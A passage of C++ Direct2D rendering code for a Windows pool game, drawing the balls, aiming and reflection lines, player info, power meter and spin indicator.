    SafeRelease(&pBrush);

    // Draw Headstring Line (White)
    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pBrush);
    if (!pBrush) return;
    pRT->DrawLine(
        D2D1::Point2F(HEADSTRING_X, TABLE_TOP),
        D2D1::Point2F(HEADSTRING_X, TABLE_BOTTOM),
        pBrush,
        1.0f // Line thickness
    );
    SafeRelease(&pBrush);
}


void DrawBalls(ID2D1RenderTarget* pRT) {
    ID2D1SolidColorBrush* pBrush = nullptr;
    ID2D1SolidColorBrush* pStripeBrush = nullptr; // For stripe pattern

    pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBrush); // Placeholder
    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);

    if (!pBrush || !pStripeBrush) {
        SafeRelease(&pBrush);
        SafeRelease(&pStripeBrush);
        return;
    }


    for (size_t i = 0; i < balls.size(); ++i) {
        const Ball& b = balls[i];
        if (!b.isPocketed) {
            D2D1_ELLIPSE ellipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

            // Set main ball color
            pBrush->SetColor(b.color);
            pRT->FillEllipse(&ellipse, pBrush);

            // Draw Stripe if applicable
            if (b.type == BallType::STRIPE) {
                // Draw a white band across the middle (simplified stripe)
                D2D1_RECT_F stripeRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS * 0.4f, b.x + BALL_RADIUS, b.y + BALL_RADIUS * 0.4f);
                // Need to clip this rectangle to the ellipse bounds - complex!
                // Alternative: Draw two colored arcs leaving a white band.
                // Simplest: Draw a white circle inside, slightly smaller.
                D2D1_ELLIPSE innerEllipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS * 0.6f, BALL_RADIUS * 0.6f);
                pRT->FillEllipse(innerEllipse, pStripeBrush); // White center part
                pBrush->SetColor(b.color); // Set back to stripe color
                pRT->FillEllipse(innerEllipse, pBrush); // Fill again, leaving a ring - No, this isn't right.

                // Let's try drawing a thick white line across
                // This doesn't look great. Just drawing solid red for stripes for now.
            }

            // Draw Number (Optional - requires more complex text layout or pre-rendered textures)
            // if (b.id != 0 && pTextFormat) {
            //     std::wstring numStr = std::to_wstring(b.id);
            //     D2D1_RECT_F textRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS, b.x + BALL_RADIUS, b.y + BALL_RADIUS);
            //     ID2D1SolidColorBrush* pNumBrush = nullptr;
            //     D2D1_COLOR_F numCol = (b.type == BallType::SOLID || b.id == 8) ? D2D1::ColorF(D2D1::ColorF::Black) : D2D1::ColorF(D2D1::ColorF::White);
            //     pRT->CreateSolidColorBrush(numCol, &pNumBrush);
            //     // Create a smaller text format...
            //     // pRT->DrawText(numStr.c_str(), numStr.length(), pSmallTextFormat, &textRect, pNumBrush);
            //     SafeRelease(&pNumBrush);
            // }
        }
    }

    SafeRelease(&pBrush);
    SafeRelease(&pStripeBrush);
}


void DrawAimingAids(ID2D1RenderTarget* pRT) {
    // Condition check at start (Unchanged)
    if (currentGameState != PLAYER1_TURN && currentGameState != PLAYER2_TURN &&
        currentGameState != BREAKING && currentGameState != AIMING)
    {
        return;
    }

    Ball* cueBall = GetCueBall();
    if (!cueBall || cueBall->isPocketed) return; // Don't draw if cue ball is gone

    ID2D1SolidColorBrush* pBrush = nullptr;
    ID2D1SolidColorBrush* pGhostBrush = nullptr;
    ID2D1StrokeStyle* pDashedStyle = nullptr;
    ID2D1SolidColorBrush* pCueBrush = nullptr;
    ID2D1SolidColorBrush* pReflectBrush = nullptr; // Brush for reflection line

    // Ensure render target is valid
    if (!pRT) return;

    // Create Brushes and Styles (check for failures)
    HRESULT hr;
    hr = pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
    if FAILED(hr) { SafeRelease(&pBrush); return; }
    hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
    if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); return; }
    hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
    if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); return; }
    // Create reflection brush (e.g., lighter shade or different color)
    hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
    if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); SafeRelease(&pReflectBrush); return; }

    if (pFactory) {
        D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
        strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
        hr = pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
        if FAILED(hr) { pDashedStyle = nullptr; }
    }


    // --- Cue Stick Drawing (Unchanged from previous fix) ---
    const float baseStickLength = 150.0f;
    const float baseStickThickness = 4.0f;
    float stickLength = baseStickLength * 1.4f;
    float stickThickness = baseStickThickness * 1.5f;
    float stickAngle = cueAngle + PI;
    float powerOffset = 0.0f;
    if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
        powerOffset = shotPower * 5.0f;
    }
    D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
    D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
    pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);


    // --- Projection Line Calculation ---
    float cosA = cosf(cueAngle);
    float sinA = sinf(cueAngle);
    float rayLength = TABLE_WIDTH + TABLE_HEIGHT; // Ensure ray is long enough
    D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
    D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);

    // Find the first ball hit by the aiming ray
    Ball* hitBall = nullptr;
    float firstHitDistSq = -1.0f;
    D2D1_POINT_2F ballCollisionPoint = { 0, 0 }; // Point on target ball circumference
    D2D1_POINT_2F ghostBallPosForHit = { 0, 0 }; // Ghost ball pos for the hit ball

    hitBall = FindFirstHitBall(rayStart, cueAngle, firstHitDistSq);
    if (hitBall) {
        // Calculate the point on the target ball's circumference
        float collisionDist = sqrtf(firstHitDistSq);
        ballCollisionPoint = D2D1::Point2F(rayStart.x + cosA * collisionDist, rayStart.y + sinA * collisionDist);
        // Calculate ghost ball position for this specific hit (used for projection consistency)
        ghostBallPosForHit = D2D1::Point2F(hitBall->x - cosA * BALL_RADIUS, hitBall->y - sinA * BALL_RADIUS); // Approx.
    }

    // Find the first rail hit by the aiming ray
    D2D1_POINT_2F railHitPoint = rayEnd; // Default to far end if no rail hit
    float minRailDistSq = rayLength * rayLength;
    int hitRailIndex = -1; // 0:Left, 1:Right, 2:Top, 3:Bottom

    // Define table edge segments for intersection checks
    D2D1_POINT_2F topLeft = D2D1::Point2F(TABLE_LEFT, TABLE_TOP);
    D2D1_POINT_2F topRight = D2D1::Point2F(TABLE_RIGHT, TABLE_TOP);
    D2D1_POINT_2F bottomLeft = D2D1::Point2F(TABLE_LEFT, TABLE_BOTTOM);
    D2D1_POINT_2F bottomRight = D2D1::Point2F(TABLE_RIGHT, TABLE_BOTTOM);

    D2D1_POINT_2F currentIntersection;

    // Check Left Rail
    if (LineSegmentIntersection(rayStart, rayEnd, topLeft, bottomLeft, currentIntersection)) {
        float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
        if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 0; }
    }
    // Check Right Rail
    if (LineSegmentIntersection(rayStart, rayEnd, topRight, bottomRight, currentIntersection)) {
        float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
        if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 1; }
    }
    // Check Top Rail
    if (LineSegmentIntersection(rayStart, rayEnd, topLeft, topRight, currentIntersection)) {
        float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
        if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 2; }
    }
    // Check Bottom Rail
    if (LineSegmentIntersection(rayStart, rayEnd, bottomLeft, bottomRight, currentIntersection)) {
        float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
        if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 3; }
    }


    // --- Determine final aim line end point ---
    D2D1_POINT_2F finalLineEnd = railHitPoint; // Assume rail hit first
    bool aimingAtRail = true;

    if (hitBall && firstHitDistSq < minRailDistSq) {
        // Ball collision is closer than rail collision
        finalLineEnd = ballCollisionPoint; // End line at the point of contact on the ball
        aimingAtRail = false;
    }

    // --- Draw Primary Aiming Line ---
    pRT->DrawLine(rayStart, finalLineEnd, pBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

    // --- Draw Target Circle/Indicator ---
    D2D1_ELLIPSE targetCircle = D2D1::Ellipse(finalLineEnd, BALL_RADIUS / 2.0f, BALL_RADIUS / 2.0f);
    pRT->DrawEllipse(&targetCircle, pBrush, 1.0f);

    // --- Draw Projection/Reflection Lines ---
    if (!aimingAtRail && hitBall) {
        // Aiming at a ball: Draw Ghost Cue Ball and Target Ball Projection
        D2D1_ELLIPSE ghostCue = D2D1::Ellipse(ballCollisionPoint, BALL_RADIUS, BALL_RADIUS); // Ghost ball at contact point
        pRT->DrawEllipse(ghostCue, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

        // Calculate target ball projection based on impact line (cue collision point -> target center)
        float targetProjectionAngle = atan2f(hitBall->y - ballCollisionPoint.y, hitBall->x - ballCollisionPoint.x);
        // Clamp angle calculation if distance is tiny
        if (GetDistanceSq(hitBall->x, hitBall->y, ballCollisionPoint.x, ballCollisionPoint.y) < 1.0f) {
            targetProjectionAngle = cueAngle; // Fallback if overlapping
        }

        D2D1_POINT_2F targetStartPoint = D2D1::Point2F(hitBall->x, hitBall->y);
        D2D1_POINT_2F targetProjectionEnd = D2D1::Point2F(
            hitBall->x + cosf(targetProjectionAngle) * 50.0f, // Projection length 50 units
            hitBall->y + sinf(targetProjectionAngle) * 50.0f
        );
        // Draw solid line for target projection
        pRT->DrawLine(targetStartPoint, targetProjectionEnd, pBrush, 1.0f);

        // -- Cue Ball Path after collision (Optional, requires physics) --
        // Very simplified: Assume cue deflects, angle depends on cut angle.
        // float cutAngle = acosf(cosf(cueAngle - targetProjectionAngle)); // Angle between paths
        // float cueDeflectionAngle = ? // Depends on cutAngle, spin, etc. Hard to predict accurately.
        // D2D1_POINT_2F cueProjectionEnd = ...
        // pRT->DrawLine(ballCollisionPoint, cueProjectionEnd, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

        // --- Accuracy Comment ---
        // Note: The visual accuracy of this projection, especially for cut shots (hitting the ball off-center)
        // or shots with spin, is limited by the simplified physics model. Real pool physics involves
        // collision-induced throw, spin transfer, and cue ball deflection not fully simulated here.
        // The ghost ball method shows the *ideal* line for a center-cue hit without spin.

    }
    else if (aimingAtRail && hitRailIndex != -1) {
        // Aiming at a rail: Draw reflection line
        float reflectAngle = cueAngle;
        // Reflect angle based on which rail was hit
        if (hitRailIndex == 0 || hitRailIndex == 1) { // Left or Right rail
            reflectAngle = PI - cueAngle; // Reflect horizontal component
        }
        else { // Top or Bottom rail
            reflectAngle = -cueAngle; // Reflect vertical component
        }
        // Normalize angle if needed (atan2 usually handles this)
        while (reflectAngle > PI) reflectAngle -= 2 * PI;
        while (reflectAngle <= -PI) reflectAngle += 2 * PI;


        float reflectionLength = 60.0f; // Length of the reflection line
        D2D1_POINT_2F reflectionEnd = D2D1::Point2F(
            finalLineEnd.x + cosf(reflectAngle) * reflectionLength,
            finalLineEnd.y + sinf(reflectAngle) * reflectionLength
        );

        // Draw the reflection line (e.g., using a different color/style)
        pRT->DrawLine(finalLineEnd, reflectionEnd, pReflectBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);
    }

    // Release resources
    SafeRelease(&pBrush);
    SafeRelease(&pGhostBrush);
    SafeRelease(&pCueBrush);
    SafeRelease(&pReflectBrush); // Release new brush
    SafeRelease(&pDashedStyle);
}

void DrawUI(ID2D1RenderTarget* pRT) {
    if (!pTextFormat || !pLargeTextFormat) return;

    ID2D1SolidColorBrush* pBrush = nullptr;
    pRT->CreateSolidColorBrush(UI_TEXT_COLOR, &pBrush);
    if (!pBrush) return;

    // --- Player Info Area (Top Left/Right) --- (Unchanged)
    float uiTop = TABLE_TOP - 80;
    float uiHeight = 60;
    float p1Left = TABLE_LEFT;
    float p1Width = 150;
    float p2Left = TABLE_RIGHT - p1Width;
    D2D1_RECT_F p1Rect = D2D1::RectF(p1Left, uiTop, p1Left + p1Width, uiTop + uiHeight);
    D2D1_RECT_F p2Rect = D2D1::RectF(p2Left, uiTop, p2Left + p1Width, uiTop + uiHeight);

    // Player 1 Info Text (Unchanged)
    std::wostringstream oss1;
    oss1 << player1Info.name.c_str() << L""\n"";
    if (player1Info.assignedType != BallType::NONE) {
        oss1 << ((player1Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
        oss1 << L"" ["" << player1Info.ballsPocketedCount << L""/7]"";
    }
    else {
        oss1 << L""(Undecided)"";
    }
    pRT->DrawText(oss1.str().c_str(), (UINT32)oss1.str().length(), pTextFormat, &p1Rect, pBrush);
    // Draw Player 1 Side Ball
    if (player1Info.assignedType != BallType::NONE)
    {
        ID2D1SolidColorBrush* pBallBrush = nullptr;
        D2D1_COLOR_F ballColor = (player1Info.assignedType == BallType::SOLID) ?
            D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
        pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
        if (pBallBrush)
        {
            D2D1_POINT_2F ballCenter = D2D1::Point2F(p1Rect.right + 10.0f, p1Rect.top + 20.0f);
            float radius = 10.0f;
            D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
            pRT->FillEllipse(&ball, pBallBrush);
            SafeRelease(&pBallBrush);
            // Draw border around the ball
            ID2D1SolidColorBrush* pBorderBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
            if (pBorderBrush)
            {
                pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                SafeRelease(&pBorderBrush);
            }

            // If stripes, draw a stripe band
            if (player1Info.assignedType == BallType::STRIPE)
            {
                ID2D1SolidColorBrush* pStripeBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                if (pStripeBrush)
                {
                    D2D1_RECT_F stripeRect = D2D1::RectF(
                        ballCenter.x - radius,
                        ballCenter.y - 3.0f,
                        ballCenter.x + radius,
                        ballCenter.y + 3.0f
                    );
                    pRT->FillRectangle(&stripeRect, pStripeBrush);
                    SafeRelease(&pStripeBrush);
                }
            }
        }
    }


    // Player 2 Info Text (Unchanged)
    std::wostringstream oss2;
    oss2 << player2Info.name.c_str() << L""\n"";
    if (player2Info.assignedType != BallType::NONE) {
        oss2 << ((player2Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
        oss2 << L"" ["" << player2Info.ballsPocketedCount << L""/7]"";
    }
    else {
        oss2 << L""(Undecided)"";
    }
    pRT->DrawText(oss2.str().c_str(), (UINT32)oss2.str().length(), pTextFormat, &p2Rect, pBrush);
    // Draw Player 2 Side Ball
    if (player2Info.assignedType != BallType::NONE)
    {
        ID2D1SolidColorBrush* pBallBrush = nullptr;
        D2D1_COLOR_F ballColor = (player2Info.assignedType == BallType::SOLID) ?
            D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
        pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
        if (pBallBrush)
        {
            D2D1_POINT_2F ballCenter = D2D1::Point2F(p2Rect.right + 10.0f, p2Rect.top + 20.0f);
            float radius = 10.0f;
            D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
            pRT->FillEllipse(&ball, pBallBrush);
            SafeRelease(&pBallBrush);
            // Draw border around the ball
            ID2D1SolidColorBrush* pBorderBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
            if (pBorderBrush)
            {
                pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                SafeRelease(&pBorderBrush);
            }

            // If stripes, draw a stripe band
            if (player2Info.assignedType == BallType::STRIPE)
            {
                ID2D1SolidColorBrush* pStripeBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                if (pStripeBrush)
                {
                    D2D1_RECT_F stripeRect = D2D1::RectF(
                        ballCenter.x - radius,
                        ballCenter.y - 3.0f,
                        ballCenter.x + radius,
                        ballCenter.y + 3.0f
                    );
                    pRT->FillRectangle(&stripeRect, pStripeBrush);
                    SafeRelease(&pStripeBrush);
                }
            }
        }
    }


    // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
    ID2D1SolidColorBrush* pArrowBrush = nullptr;
    pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
    if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
        float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
        float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
        float arrowTipX, arrowBackX;

        if (currentPlayer == 1) {
            // Player 1: Arrow left of P1 box, pointing right
            arrowBackX = p1Rect.left - 25.0f; // Position left of the box
            arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
            // Define points for right-pointing arrow
            D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
            D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
            D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back

            ID2D1PathGeometry* pPath = nullptr;
            if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
                ID2D1GeometrySink* pSink = nullptr;
                if (SUCCEEDED(pPath->Open(&pSink))) {
                    pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
                    pSink->AddLine(pt2);
                    pSink->AddLine(pt3);
                    pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                    pSink->Close();
                    SafeRelease(&pSink);
                    pRT->FillGeometry(pPath, pArrowBrush);
                }
                SafeRelease(&pPath);
            }
        }
        else { // Player 2
         // Player 2: Arrow left of P2 box, pointing right (or right of P2 box pointing left?)
         // Let's keep it consistent: Arrow left of the active player's box, pointing right.
            arrowBackX = p2Rect.left - 25.0f; // Position left of the box
            arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
            // Define points for right-pointing arrow
            D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
            D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
            D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back

            ID2D1PathGeometry* pPath = nullptr;
            if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
                ID2D1GeometrySink* pSink = nullptr;
                if (SUCCEEDED(pPath->Open(&pSink))) {
                    pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
                    pSink->AddLine(pt2);
                    pSink->AddLine(pt3);
                    pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                    pSink->Close();
                    SafeRelease(&pSink);
                    pRT->FillGeometry(pPath, pArrowBrush);
                }
                SafeRelease(&pPath);
            }
        }
        SafeRelease(&pArrowBrush);
    }


    // --- MODIFIED: Foul Text (Large Red, Bottom Center) ---
    if (foulCommitted && currentGameState != SHOT_IN_PROGRESS) {
        ID2D1SolidColorBrush* pFoulBrush = nullptr;
        pRT->CreateSolidColorBrush(FOUL_TEXT_COLOR, &pFoulBrush);
        if (pFoulBrush && pLargeTextFormat) {
            // Calculate Rect for bottom-middle area
            float foulWidth = 200.0f; // Adjust width as needed
            float foulHeight = 60.0f;
            float foulLeft = TABLE_LEFT + (TABLE_WIDTH / 2.0f) - (foulWidth / 2.0f);
            // Position below the pocketed balls bar
            float foulTop = pocketedBallsBarRect.bottom + 10.0f;
            D2D1_RECT_F foulRect = D2D1::RectF(foulLeft, foulTop, foulLeft + foulWidth, foulTop + foulHeight);

            // --- Set text alignment to center for foul text ---
            pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

            pRT->DrawText(L""FOUL!"", 5, pLargeTextFormat, &foulRect, pFoulBrush);

            // --- Restore default alignment for large text if needed elsewhere ---
            // pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
            // pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

            SafeRelease(&pFoulBrush);
        }
    }

    // Show AI Thinking State (Unchanged from previous step)
    if (currentGameState == AI_THINKING && pTextFormat) {
        ID2D1SolidColorBrush* pThinkingBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pThinkingBrush);
        if (pThinkingBrush) {
            D2D1_RECT_F thinkingRect = p2Rect;
            thinkingRect.top += 20; // Offset within P2 box
            // Ensure default text alignment for this
            pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
            pRT->DrawText(L""Thinking..."", 11, pTextFormat, &thinkingRect, pThinkingBrush);
            SafeRelease(&pThinkingBrush);
        }
    }

    SafeRelease(&pBrush);

    // --- Draw CHEAT MODE label if active ---
    if (cheatModeEnabled) {
        ID2D1SolidColorBrush* pCheatBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Red), &pCheatBrush);
        if (pCheatBrush && pTextFormat) {
            D2D1_RECT_F cheatTextRect = D2D1::RectF(
                TABLE_LEFT + 10.0f,
                TABLE_TOP + 10.0f,
                TABLE_LEFT + 200.0f,
                TABLE_TOP + 40.0f
            );
            pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
            pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
            pRT->DrawText(L""CHEAT MODE ON"", wcslen(L""CHEAT MODE ON""), pTextFormat, &cheatTextRect, pCheatBrush);
        }
        SafeRelease(&pCheatBrush);
    }
}

void DrawPowerMeter(ID2D1RenderTarget* pRT) {
    // Draw Border
    ID2D1SolidColorBrush* pBorderBrush = nullptr;
    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
    if (!pBorderBrush) return;
    pRT->DrawRectangle(&powerMeterRect, pBorderBrush, 2.0f);
    SafeRelease(&pBorderBrush);

    // Create Gradient Fill
    ID2D1GradientStopCollection* pGradientStops = nullptr;
    ID2D1LinearGradientBrush* pGradientBrush = nullptr;
    D2D1_GRADIENT_STOP gradientStops[4];
    gradientStops[0].position = 0.0f;
    gradientStops[0].color = D2D1::ColorF(D2D1::ColorF::Green);
    gradientStops[1].position = 0.45f;
    gradientStops[1].color = D2D1::ColorF(D2D1::ColorF::Yellow);
    gradientStops[2].position = 0.7f;
    gradientStops[2].color = D2D1::ColorF(D2D1::ColorF::Orange);
    gradientStops[3].position = 1.0f;
    gradientStops[3].color = D2D1::ColorF(D2D1::ColorF::Red);

    pRT->CreateGradientStopCollection(gradientStops, 4, &pGradientStops);
    if (pGradientStops) {
        D2D1_LINEAR_GRADIENT_BRUSH_PROPERTIES props = {};
        props.startPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.bottom);
        props.endPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.top);
        pRT->CreateLinearGradientBrush(props, pGradientStops, &pGradientBrush);
        SafeRelease(&pGradientStops);
    }

    // Calculate Fill Height
    float fillRatio = 0;
    if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
        fillRatio = shotPower / MAX_SHOT_POWER;
    }
    float fillHeight = (powerMeterRect.bottom - powerMeterRect.top) * fillRatio;
    D2D1_RECT_F fillRect = D2D1::RectF(
        powerMeterRect.left,
        powerMeterRect.bottom - fillHeight,
        powerMeterRect.right,
        powerMeterRect.bottom
    );

    if (pGradientBrush) {
        pRT->FillRectangle(&fillRect, pGradientBrush);
        SafeRelease(&pGradientBrush);
    }

    // Draw scale notches
    ID2D1SolidColorBrush* pNotchBrush = nullptr;
    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pNotchBrush);
    if (pNotchBrush) {
        for (int i = 0; i <= 8; ++i) {
            float y = powerMeterRect.top + (powerMeterRect.bottom - powerMeterRect.top) * (i / 8.0f);
            pRT->DrawLine(
                D2D1::Point2F(powerMeterRect.right + 2.0f, y),
                D2D1::Point2F(powerMeterRect.right + 8.0f, y),
                pNotchBrush,
                1.5f
            );
        }
        SafeRelease(&pNotchBrush);
    }

    // Draw ""Power"" Label Below Meter
    if (pTextFormat) {
        ID2D1SolidColorBrush* pTextBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pTextBrush);
        if (pTextBrush) {
            D2D1_RECT_F textRect = D2D1::RectF(
                powerMeterRect.left - 20.0f,
                powerMeterRect.bottom + 8.0f,
                powerMeterRect.right + 20.0f,
                powerMeterRect.bottom + 38.0f
            );
            pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
            pRT->DrawText(L""Power"", 5, pTextFormat, &textRect, pTextBrush);
            SafeRelease(&pTextBrush);
        }
    }

    // Draw Glow Effect if fully charged or fading out
    static float glowPulse = 0.0f;
    static bool glowIncreasing = true;
    static float glowFadeOut = 0.0f; // NEW: tracks fading out

    if (shotPower >= MAX_SHOT_POWER * 0.99f) {
        // While fully charged, keep pulsing normally
        if (glowIncreasing) {
            glowPulse += 0.02f;
            if (glowPulse >= 1.0f) glowIncreasing = false;
        }
        else {
            glowPulse -= 0.02f;
            if (glowPulse <= 0.0f) glowIncreasing = true;
        }
        glowFadeOut = 1.0f; // Reset fade out to full
    }
    else if (glowFadeOut > 0.0f) {
        // If shot fired, gradually fade out
        glowFadeOut -= 0.02f;
        if (glowFadeOut < 0.0f) glowFadeOut = 0.0f;
    }

    if (glowFadeOut > 0.0f) {
        ID2D1SolidColorBrush* pGlowBrush = nullptr;
        float effectiveOpacity = (0.3f + 0.7f * glowPulse) * glowFadeOut;
        pRT->CreateSolidColorBrush(
            D2D1::ColorF(D2D1::ColorF::Red, effectiveOpacity),
            &pGlowBrush
        );
        if (pGlowBrush) {
            float glowCenterX = (powerMeterRect.left + powerMeterRect.right) / 2.0f;
            float glowCenterY = powerMeterRect.top;
            D2D1_ELLIPSE glowEllipse = D2D1::Ellipse(
                D2D1::Point2F(glowCenterX, glowCenterY - 10.0f),
                12.0f + 3.0f * glowPulse,
                6.0f + 2.0f * glowPulse
            );
            pRT->FillEllipse(&glowEllipse, pGlowBrush);
            SafeRelease(&pGlowBrush);
        }
    }
}

void DrawSpinIndicator(ID2D1RenderTarget* pRT) {
    ID2D1SolidColorBrush* pWhiteBrush = nullptr;
    ID2D1SolidColorBrush* pRedBrush = nullptr;

    pRT->CreateSolidColorBrush(CUE_BALL_COLOR, &pWhiteBrush);
    pRT->CreateSolidColorBrush(ENGLISH_DOT_COLOR, &pRedBrush);

    if (!pWhiteBrush || !pRedBrush) {
        SafeRelease(&pWhiteBrush);
        SafeRelease(&pRedBrush);
        return;
    }

    // Draw White Ball Background
    D2D1_ELLIPSE bgEllipse = D2D1::Ellipse(spinIndicatorCenter, spinIndicatorRadius, spinIndicatorRadius);
    pRT->FillEllipse(&bgEllipse, pWhiteBrush);
    pRT->DrawEllipse(&bgEllipse, pRedBrush, 0.5f); // Thin red border


    // Draw Red Dot for Spin Position
    float dotRadius = 4.0f;
    float dotX = spinIndicatorCenter.x + cueSpinX * (spinIndicatorRadius - dotRadius); // Keep dot inside edge
    float dotY = spinIndicatorCenter.y + cueSpinY * (spinIndicatorRadius - dotRadius);
    D2D1_ELLIPSE dotEllipse = D2D1::Ellipse(D2D1::Point2F(dotX, dotY), dotRadius, dotRadius);
    pRT->FillEllipse(&dotEllipse, pRedBrush);

    SafeRelease(&pWhiteBrush);
    SafeRelease(&pRedBrush);
}


void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT) {
    ID2D1SolidColorBrush* pBgBrush = nullptr;
